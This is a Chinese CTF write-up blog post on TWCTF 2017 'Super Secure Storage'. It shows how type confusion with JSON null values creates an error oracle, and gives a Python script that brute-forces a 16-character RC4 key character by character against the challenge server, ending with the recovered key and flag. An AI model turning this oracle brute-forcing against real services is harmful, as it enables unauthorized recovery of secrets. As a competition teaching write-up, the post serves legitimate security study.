+<p>先说长度。我们只能根据服务器端返回来的信息来判断长度是否符合。我们传入的参数key，服务器端并没有验证它的类型，也就是说我们可以传入一个list，而不是一个字符串，这样同样能传入到verify()函数中。假如我们传入key为[null,null]，这里的len(input_pass)即为2，若<code>len(enc_pass) != len(input_pass)</code>，则服务器返回<code>False</code>，但若满足了长度要求，则会进行<code>zip(enc_pass, input_pass)</code>并对每个字符加密比较（注：null这里变成了None，原因待会说）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>encKey = <span class="string">"ab"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>key = [<span class="keyword">None</span>,<span class="keyword">None</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x,y <span class="keyword">in</span> zip(encKey,key):</div><div class="line"><span class="meta">... </span>    print(x,y)</div><div class="line">...</div><div class="line">a <span class="keyword">None</span></div><div class="line">b <span class="keyword">None</span></div></pre></td></tr></table></figure></p>
+<p>在RC4的enc操作中用到了ord()：<code>chr(ord(c) ^ next(self.stream))</code>。对于None类型，ord(None)会崩溃掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>key = [<span class="keyword">None</span>,<span class="keyword">None</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ord(key[<span class="number">1</span>])</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: ord() expected string of length <span class="number">1</span>, but NoneType found</div></pre></td></tr></table></figure></p>
+<p>现在有了两种状态：False 和 Error。基于此即可得出真正key的长度。注意，服务器端接收的数据格式是JSON，在<a href="https://docs.python.org/3/library/json.html#encoders-and-decoders" target="_blank" rel="external">python的文档</a>中定义了json格式和python的转换:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/6.png?raw=true" alt=""></p>
+<p>所以我们的key，正如前面提到的传入的list中，填的是null，这样服务器端会自动解码为None。</p>
+<p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（15个null）时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/7.png?raw=true" alt=""></p>
+<p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>(16个null)时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/8.png?raw=true" alt=""></p>
+<p>这说明服务器端的encKey长度为16。</p>
+<p>接下来考虑对应字符是否相等的问题，基于前面的思路，可以利用服务器端的两种状态：False 和 Error 来判断。再看一下verify()函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(enc_pass, input_pass)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(enc_pass) != len(input_pass):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(enc_pass, input_pass):</div><div class="line">        <span class="keyword">if</span> x != rc4.enc(y):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure></p>
+<p>如果我们输入<code>key=[&quot;o&quot;,null,....,null]</code>，如果第一个字符<code>o</code>加密后恰好是encKey的第一个字符，那么它会去比较第二个字符即null，在下一次比较时会进行RC4.enc(y)，其中的ord(None)将会造成服务器的崩溃，这是状态一。如果第一个字符<code>1</code>加密后不是encKey的第一个字符，那么会直接返回False，这是状态二。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/10.png?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/11.png?raw=true" alt=""></p>
+<p>基于此，可以逐步爆破出每个字符。下面给个利用脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">"http://s3.chal.ctf.westerns.tokyo/api/data/1/check"</span></div><div class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line">key = [<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</div><div class="line">		key[index] = str(chr(i))</div><div class="line">		payload = &#123;<span class="string">"key"</span>:key&#125;</div><div class="line">		text = requests.post(url,json=payload,proxies=proxy).text</div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"500 Internal Server Error"</span> <span class="keyword">in</span> text :</div><div class="line">			print(<span class="string">""</span>.join(key[:index+<span class="number">1</span>]))</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"true"</span> <span class="keyword">in</span> text:</div><div class="line">			print(<span class="string">""</span>.join(key))</div><div class="line">			exit()</div></pre></td></tr></table></figure></p>
+<p>得到key为：t2gavAjbPtj9gyps</p>
+<p>最后访问：<a href="http://s3.chal.ctf.westerns.tokyo/#/data/1" target="_blank" rel="external">http://s3.chal.ctf.westerns.tokyo/#/data/1</a> ，在key部分填上t2gavAjbPtj9gyps</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/14.png?raw=true" alt=""></p>
+<p>即可得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;yet-an0ther-pyth0n-0racle&#125;</div></pre></td></tr></table></figure></p>
+<p>还有另一种稍显麻烦的方法（可能，不是稍显hh）。RC4算法中，用先用key生成了一个字节串K，然后用这个字节串K与明文进行异或，从而得到密文。假如我们把FLAG密文当作明文，和key传入，服务器端用key生成的是同一个字节串K，然后把字节串K与FLAG密文进行异或，返回给我们的密文即为FLAG的明文。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/5.png?raw=true" alt=""></p>
+<p>FLAG密文串为：<code>\fj\u00aa\u008cQd\u00aeg|\u0085i\&quot;\u0087b:$\u00e85Z\u00fa!R\u00dfE\u001d\u00b1)\u009e\u00d1F\u00d4*</code></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/16.png?raw=true" alt=""></p>
+<p>可以看到这个id为81252而不是1，是我们新插入的“密文”。不过这有点不好，因为访问加密的数据是不需要身份验证的，只要访问的id正确，这个flag就会被人看到了，比如你访问id为81191的密文：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/17.png?raw=true" alt=""></p>
+<p>不费吹灰之力之力就可以拿到flag。</p>
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">TWCTF 2017-Super Secure Storage-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2017年09月05日 - 15:09</p>
+  <p><span>最后更新:</span>2017年09月05日 - 21:09</p>
+  <p><span>原始链接:</span><a href="/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" title="TWCTF 2017-Super Secure Storage-writeup">http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/wechat.jpg?raw=true" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/04/hexo-rss链接问题修复方法/" rel="next" title="hexo-rss链接问题修复方法">
+                <i class="fa fa-chevron-left"></i> hexo-rss链接问题修复方法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
+                一些文章 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">119</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/findneo/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.madsome.cn" title="Mads" target="_blank">Mads</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task"><span class="nav-number">1.</span> <span class="nav-text">Task</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
